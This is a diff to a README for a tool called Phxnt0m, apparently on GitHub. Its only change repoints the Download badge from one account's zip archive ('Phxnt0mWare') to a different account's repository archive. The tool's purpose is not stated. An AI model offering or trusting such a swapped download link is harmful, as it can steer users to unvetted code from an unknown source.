@@ -18,7 +18,7 @@ Phxnt0m is an updated and more powerful version of the original Phxnt0m tool, de
 
 ## Download
 
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Phxnt0m1/Phxnt0mWare/archive/refs/heads/main.zip)
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Mrrobot101010/Phxnt0m/archive/refs/heads/main.zip)
 
 ## Installation
 
